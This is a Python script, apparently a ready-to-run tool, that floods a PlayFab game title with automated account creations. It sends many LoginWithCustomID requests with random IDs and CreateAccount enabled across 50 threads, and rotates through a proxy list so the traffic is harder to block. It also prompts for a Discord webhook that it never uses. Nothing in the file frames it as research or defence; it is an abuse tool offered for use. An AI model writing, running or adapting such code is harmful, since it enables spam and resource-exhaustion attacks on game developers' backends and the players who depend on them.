import requests
import colorama
from colorama import Fore, Style
import uuid
import os
import itertools
from concurrent.futures import ThreadPoolExecutor

colorama.init()

# ASCII Banner
BANNER = f"""{Fore.MAGENTA}
  █████▒▄▄▄     ▄▄▄█████▓▓█████ 
▓██   ▒▒████▄   ▓  ██▒ ▓▒▓█   ▀ 
▒████ ░▒██  ▀█▄ ▒ ▓██░ ▒░▒███   
░▓█▒  ░░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ 
░▒█░    ▓█   ▓██▒ ▒██▒ ░ ░▒████▒
 ▒ ░    ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░
 ░       ▒   ▒▒ ░   ░     ░ ░  ░
 ░ ░     ░   ▒    ░         ░   
             ░  ░           ░  ░
{Style.RESET_ALL}"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies():
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies if proxies else None
    except FileNotFoundError:
        return None

def send_request(title_id, proxy=None):
    custom_id = str(uuid.uuid4())
    url = f"https://{title_id}.playfabapi.com/Client/LoginWithCustomID"
    
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    
    try:
        response = requests.post(
            url,
            json={
                "TitleId": title_id,
                "CustomId": custom_id,
                "CreateAccount": True
            },
            headers={"Content-Type": "application/json"},
            proxies=proxies,
            timeout=10
        )
        return response.status_code
    except Exception as e:
        return str(e)

def send_requests_concurrently(title_id, request_count, proxies=None):
    proxy_cycle = itertools.cycle(proxies) if proxies else itertools.repeat(None)
    
    with ThreadPoolExecutor(max_workers=50) as executor:  # Increased thread count
        futures = [
            executor.submit(send_request, title_id, next(proxy_cycle))
            for _ in range(request_count)
        ]
        
        successful = 0
        for i, future in enumerate(futures, 1):
            status = future.result()
            if isinstance(status, int) and status == 200:
                successful += 1
                print(f"{Fore.GREEN}Request {i}/{request_count} successful{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Request {i}/{request_count} failed: {status}{Style.RESET_ALL}")
            
            # Progress reporting (every 1%)
            if request_count >= 100 and i % (request_count // 100) == 0:
                progress = (i / request_count) * 100
                print(f"{Fore.MAGENTA}Progress: {progress:.2f}%{Style.RESET_ALL}")
        
        return successful

def main():
    clear_screen()
    print(BANNER)
    
    webhook_url = input(f"{Fore.MAGENTA}Enter Discord webhook URL (press Enter to skip): {Style.RESET_ALL}").strip()
    title_id = input(f"{Fore.MAGENTA}Enter PlayFab Title ID: {Style.RESET_ALL}").strip()
    request_count = int(input(f"{Fore.MAGENTA}Enter number of requests to send: {Style.RESET_ALL}"))
    
    proxies = load_proxies()
    successful = send_requests_concurrently(title_id, request_count, proxies)
    failed = request_count - successful
    
    print(f"\n{Fore.MAGENTA}Summary:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Successful: {successful}{Style.RESET_ALL}")
    print(f"{Fore.RED}Failed: {failed}{Style.RESET_ALL}")
    
    input("\nPress Enter to restart...")
    main()

if __name__ == "__main__":
    main()
